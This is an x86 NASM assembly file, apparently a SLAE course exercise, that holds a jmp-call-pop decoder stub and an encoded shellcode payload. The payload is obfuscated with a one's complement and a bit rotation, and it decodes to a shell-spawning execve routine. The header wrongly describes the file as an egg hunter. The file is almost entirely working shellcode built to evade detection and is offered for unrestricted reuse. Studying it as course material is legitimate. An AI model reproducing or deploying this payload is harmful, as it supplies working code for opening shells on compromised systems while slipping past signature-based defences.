; shellcode_decoder.nasm
; 
; A Egg hunter shellcode
;
; Author: SLAE - 891
;
; You are free to use and/or redistribute it without restriction


global _start			

section .text
_start:

	jmp short call_shellcode    ; jmp, call, pop technique

decoder:
	pop esi

decode: 
	xor eax, eax
	xor ebx, ebx
	mov al, byte [esi]          ; we move the byte to be decoded
	not al                      ; one's complement
	rol al, 4                   ; rolling on left to decode the rolling on right encoding
	mov byte [esi], al          ; saving the decoded byte

	lea esi, [esi + 1]          ; next byte   
	mov bl, [esi]  
	cmp bl, 0xaa                ; looking for the end of encoded shellcode
	je short EncodedShellcode   ; we jump to the decoded shellcode
	jmp short decode	        ; keeping on decoding

call_shellcode:

	call decoder
	EncodedShellcode: db 0xec,0xf3,0xfa,0x79,0xd9,0xe9,0xc8,0x79,0x79,0xd9,0x69,0x19,0x0d,0x79,0x0d,0x0d,0x0d,0x0d,0x67,0xc1,0xfa,0x67,0xd1,0xca,0x67,0xe1,0xf4,0x4f,0x23,0xf7,0xaa
